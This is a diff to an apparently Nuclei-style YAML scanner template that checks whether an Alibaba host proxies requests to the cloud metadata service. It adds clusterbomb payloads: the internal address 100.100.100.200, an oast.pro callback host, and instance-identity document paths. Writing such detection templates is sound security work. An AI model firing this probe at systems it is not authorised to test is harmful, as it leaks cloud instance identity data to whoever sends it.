@@ -1,15 +1,21 @@
 http:
-- matchers:
-  - part: body
+- attack: clusterbomb
+  matchers:
+  - condition: and
+    part: body
     type: word
     words:
-    - zone-id
+    - '"serial-number"'
+    - '"zone-id":"'
   payloads:
     hostval:
-    - alibaba.interact.sh
+    - alibaba.oast.pro
     - 100.100.100.200
+    path:
+    - latest/dynamic/instance-identity/document
+    - 2016-01-01/dynamic/instance-identity/document
   raw:
-  - 'GET http://{{hostval}}/dynamic/instance-identity/document HTTP/1.1
+  - 'GET http://{{hostval}}/{{path}} HTTP/1.1
 
     Host: {{hostval}}
 
@@ -18,7 +24,7 @@ http:
   unsafe: true
 id: metadata-service-alibaba
 info:
-  author: sullo
+  author: sullo,pwnhxl
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
     cvss-score: 9.3
@@ -26,7 +32,7 @@ info:
   description: The Alibaba host is configured as a proxy which allows access to the
     metadata service. This could allow significant access to the host/infrastructure.
   metadata:
-    max-request: 2
+    max-request: 4
   name: Alibaba Metadata Service Check
   reference:
   - https://www.alibabacloud.com/help/doc-detail/108460.htm
@@ -35,4 +41,4 @@ info:
   remediation: Disable the proxy or restrict configuration to only allow access to
     approved hosts/ports. Upgrade to IMDSv2 if possible.
   severity: critical
-  tags: exposure,config,alibaba,proxy,misconfig,metadata
+  tags: exposure,config,alibaba,proxy,misconfig,metadata,vuln
